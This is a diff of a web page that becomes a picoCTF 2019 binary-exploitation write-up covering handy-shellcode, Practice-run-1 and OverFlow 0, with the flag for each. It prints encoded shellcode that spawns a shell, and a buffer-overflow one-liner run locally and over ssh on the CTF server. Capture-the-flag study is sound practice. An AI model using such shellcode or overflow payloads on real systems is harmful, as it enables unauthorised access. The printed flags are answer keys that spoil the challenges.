@@ -13,7 +13,7 @@
     </script>
 
     <meta charset="utf-8">
-    <title> Python Code | Math Operator </title>
+    <title> picoCTF2019 | Binary Writeup </title>
     <link rel="shortcut icon" href="../../../../img/favicon.ico" width="70">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800,900|Cormorant+Garamond:300,300i,400,400i,500,500i,600,600i,700,700i">
@@ -23,7 +23,7 @@
       <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/themes/prism.min.css"> -->
       <link rel="stylesheet" href="../../../../css/style.css">
       <link rel="stylesheet" href="../../../../css/personal_icon.css">
-      <link rel="stylesheet" href="../../../../res/prism_themes/prism-monokai.css">
+      <link rel="stylesheet" href="../../../../res/prism_themes/prism-base16-ateliersulphurpool.light.css">
       <link rel="stylesheet" href="../ctf.css">
 
   </head>
@@ -36,9 +36,9 @@
       <a href="../../../../index.html" class="header-brand"> CAPTAIN </a>
       <nav>
           <ul>
-            <li><a href="../../python.html"> Python </a> </li>
+            <li><a href="../../../python/python.html"> Python </a> </li>
             <li><a href="../../../c_plus_plus/c_plus_plus.html"> C / C++ </a> </li>
-            <li><a href="../../../basc/basc.html"> BASC </a> </li>
+            <li><a href="../../basc.html"> BASC </a> </li>
             <li><a href="../../../machine_learning/machine_learning.html"> ML </a> </li>
             <li><a href="../../../android/android.html"> Android </a> </li>
             <li><a href="../../../raspberry/raspberry.html"> Raspberry </a> </li>
@@ -70,9 +70,103 @@
     <br><br><br><br><br><br>
     <div class="container">
       <article role="article">
-    		<h3> picoCTF2019 Writeup </h3>
-        <p> B elow we cover all the write up for the CTF </p>
+    		<h3> Binary Writeup </h3>
+        <br>
 
+        <dl>
+          <dt> handy-shellcode - Points 50 </dt>
+          <dd> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. Source. </dd>
+
+          <blockquote>
+            <p><strong>Hint:</strong> You might be able to find some good shellcode online. </p>
+          </blockquote>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-bash">
+$ uname -a                          # look the architecture type (ex: x86_64)
+$ cat ~/shellcode.txt - | ./vuln    # write the shellcode to a file, execute it
+                                    # and keep the shell waiting for stdin
+
+$ python -c "print('\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7
+\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce
+\x81')"> ~/shellcode.txt
+
+$ cat ~/shellcode.txt - | ./vuln
+          </code></pre>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong>picoCTF{ca1cu1at1ng_Mach1n3s_0ecd0}</strong></p>
+          </blockquote>
+        </dl>
+        </div>
+
+        <hr> <!-- Finish post  -->
+        <dl>
+          <dt> Practice-run-1 -  Points: 50 </dt>
+          <dd> You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag </dd>
+
+          <blockquote>
+            <p><strong>Hint:</strong> How do you execute a program in a command line? </p>
+          </blockquote>
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-bash">
+$ chmod +x run_this
+$ ./run_this
+          </code></pre>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong>picoCTF{g3t_r3adY_2_r3v3r53}</strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr> <!-- Finish post  -->
+
+        <dl>
+          <dt> OverFlow 0 - Points: 100 </dt>
+          <dd> This should be easy. Overflow the correct buffer in this program and get a flag. Its
+          also found in /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server.
+          Source. </dd>
+
+          <blockquote>
+            <p><strong>Hint:</strong> Find a way to trigger the flag to printIf you try to do the math by hand, maybe try and add a few more characters. </p>
+          </blockquote>
+
+          <blockquote>
+            <p><strong>Hint:</strong> Sometimes there are things you aren't expecting. </p>
+          </blockquote>
+
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-bash">
+# create a flag.txt file
+$ chmod +x ./vuln
+$ ./vuln `python -c "print('a'*(10000))"`
+
+# ..and once you got the flag try the same on the server
+$ ssh username@2019shell1.picoctf.com
+$ cd /path/to/directory
+$ ./vuln `python -c "print('a'*(10000))"`
+          </code></pre>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong>picoCTF{3asY_P3a5yb197d4e2}</strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr> <!-- Finish post  -->
 
 <section class="" role="group">
   <button id="previous" > Previous </button>
